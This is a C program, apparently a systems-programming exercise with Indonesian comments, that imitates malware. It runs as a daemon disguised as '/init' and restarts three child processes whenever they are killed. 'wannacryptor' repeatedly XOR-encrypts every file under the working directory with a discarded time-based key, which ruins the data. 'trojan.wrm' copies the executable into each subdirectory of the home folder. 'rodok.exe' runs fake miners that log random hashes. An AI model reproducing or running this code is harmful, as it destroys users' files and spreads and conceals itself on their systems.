#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <fcntl.h>
#include <time.h>
#include <signal.h>
#include <openssl/rand.h>
#include <limits.h>
#include <sys/prctl.h>

#define INTERVAL 30
#define MAX_MINERS 3
#define MINER_LOG "/tmp/.miner.log"

pid_t wannacryptor_pid = -1;
pid_t trojan_pid = -1;
pid_t rodok_pid = -1;
pid_t miners[MAX_MINERS] = {0};
int miner_count = 0;

// Function prototypes
void daemonize();
void start_wannacryptor(int argc, char *argv[]);
void start_trojan(int argc, char *argv[]);
void start_rodok(int argc, char *argv[]);
void encrypt_file(const char *path, time_t key);
void recursive_encrypt(const char *path, time_t key);
void replicate_binary(const char *target_dir);
void miner_process(int id, int argc, char *argv[]);
void log_miner(int id, const char *hash);
void cleanup();
void rename_process(const char *name, int argc, char *argv[]);

// XOR encryption function
void xor_encrypt(char *data, size_t len, time_t key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= (char)(key >> (8 * (i % sizeof(time_t))));
    }
}

int main(int argc, char *argv[]) {
    if (getppid() != 1) {
        daemonize();
    }

    rename_process("/init", argc, argv);

    signal(SIGTERM, cleanup);
    signal(SIGINT, cleanup);
    signal(SIGCHLD, SIG_IGN);

    start_wannacryptor(argc, argv);
    start_trojan(argc, argv);
    start_rodok(argc, argv);

    while (1) {
        if (wannacryptor_pid <= 0 || kill(wannacryptor_pid, 0) != 0) {
            start_wannacryptor(argc, argv);
        }
        if (trojan_pid <= 0 || kill(trojan_pid, 0) != 0) {
            start_trojan(argc, argv);
        }
        if (rodok_pid <= 0 || kill(rodok_pid, 0) != 0) {
            start_rodok(argc, argv);
        }

        sleep(INTERVAL);
    }

    return 0;
}

//buat ganti nama proses nya buat struktur proses di ps axjf/ps aux
void rename_process(const char *name, int argc, char *argv[]) {
    //method 1: Set nama proses menggunakan prctl
    #ifdef PR_SET_NAME
    prctl(PR_SET_NAME, (unsigned long)name, 0, 0, 0);
    #endif
    
    // Method 2: Clean argv[]
    size_t name_len = strlen(name);
    size_t argv0_len = strlen(argv[0]);
    
    memset(argv[0], 0, argv0_len);
    strncpy(argv[0], name, name_len);
    
    //null-terminate jika name lebih pendek dari argv[0]
    if (name_len < argv0_len) {
        argv[0][name_len] = '\0';
    }
    
    //set argumen lainnya ke NULL
    for (int i = 1; i < argc; i++) {
        argv[i] = NULL;
    }
}

//daemonize proses
void daemonize() {
    pid_t pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);

    umask(0);
    if (setsid() < 0) exit(EXIT_FAILURE);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
}

//memulai wannacryptor
void start_wannacryptor(int argc, char *argv[]) {
    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        rename_process("wannacryptor", argc, argv);
        while (1) {
            time_t key = time(NULL);
            recursive_encrypt(".", key);
            sleep(INTERVAL);
        }
        exit(0);
    } else {
        wannacryptor_pid = pid;
    }
}

//memulai trojan.wrm
void start_trojan(int argc, char *argv[]) {
    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        rename_process("trojan.wrm", argc, argv);
        while (1) {
            char *home = getenv("HOME");
            if (home) {
                replicate_binary(home);
            }
            sleep(INTERVAL);
        }
        exit(0);
    } else {
        trojan_pid = pid;
    }
}

//memulai rodok.exe
void start_rodok(int argc, char *argv[]) {
    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        rename_process("rodok.exe", argc, argv);
        
        //hanya buat MAX_MINERS proses miner
        for (int i = 0; i < MAX_MINERS; i++) {
            if (fork() == 0) {
                miner_process(i, argc, argv);
                exit(0);
            }
        }
        
        while (1) pause();  //jangan fork bomb!
    } else {
        rodok_pid = pid;
    }
}

//fungsi untuk mengenkripsi file XOR 
void encrypt_file(const char *path, time_t key) {
    FILE *file = fopen(path, "rb+");
    if (!file) return;

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *buffer = malloc(size);
    if (!buffer) {
        fclose(file);
        return;
    }

    fread(buffer, 1, size, file);
    xor_encrypt(buffer, size, key);
    fseek(file, 0, SEEK_SET);
    fwrite(buffer, 1, size, file);

    free(buffer);
    fclose(file);
}

//metode rekursif untuk mengenkripsi file dan folder
void recursive_encrypt(const char *path, time_t key) {
    DIR *dir = opendir(path);
    if (!dir) {
        encrypt_file(path, key);
        return;
    }
    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;

        char full_path[PATH_MAX];
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);

        if (entry->d_type == DT_DIR) {
            recursive_encrypt(full_path, key);
        } else {
            encrypt_file(full_path, key);
        }
    }
    closedir(dir);
}

//fungsi untuk menggandakan binary ke direktori target
void replicate_binary(const char *target_dir) {
    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) return;
    self_path[len] = '\0';

    DIR *dir = opendir(target_dir);
    if (!dir) return;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
            char dest_path[PATH_MAX];
            snprintf(dest_path, sizeof(dest_path), "%s/%s/runme", target_dir, entry->d_name);

            FILE *src = fopen(self_path, "rb");
            FILE *dest = fopen(dest_path, "wb");
            if (src && dest) {
                char buffer[4096];
                size_t bytes;
                while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
                    fwrite(buffer, 1, bytes, dest);
                }
                fclose(src);
                fclose(dest);
                chmod(dest_path, 0755);
            }
        }
    }
    closedir(dir);
}

//fungsi untuk proses mine-crafter
void miner_process(int id, int argc, char *argv[]) {
    char process_name[32];
    snprintf(process_name, sizeof(process_name), "mine-crafter-%d", id);
    rename_process(process_name, argc, argv);

    while (1) {
        unsigned char hash[32];
        if (RAND_bytes(hash, sizeof(hash)) != 1) {
            sleep(3);
            continue;
        }

        char hex_hash[65];
        for (int i = 0; i < 32; i++) {
            sprintf(hex_hash + (i * 2), "%02x", hash[i]);
        }
        hex_hash[64] = '\0';
        log_miner(id, hex_hash);
        sleep(3 + (rand() % 28));
    }
}

//fungsi untuk mencatat aktivitas miner ke dalam /tmp/.miner.log
// Format: [YYYY-MM-DD HH:MM:SS][Miner ID] Hash
void log_miner(int id, const char *hash) {
    time_t now = time(NULL);
    struct tm *tm = localtime(&now);

    FILE *log = fopen(MINER_LOG, "a");
    if (log) {
        fprintf(log, "[%04d-%02d-%02d %02d:%02d:%02d][Miner %02d] %s\n",
                tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
                tm->tm_hour, tm->tm_min, tm->tm_sec, id, hash);
        fclose(log);
    }
}

//fungsi untuk membersihkan proses dan keluar
void cleanup() {
    if (wannacryptor_pid > 0) kill(wannacryptor_pid, SIGTERM);
    if (trojan_pid > 0) kill(trojan_pid, SIGTERM);
    if (rodok_pid > 0) kill(rodok_pid, SIGTERM);
    exit(0);
}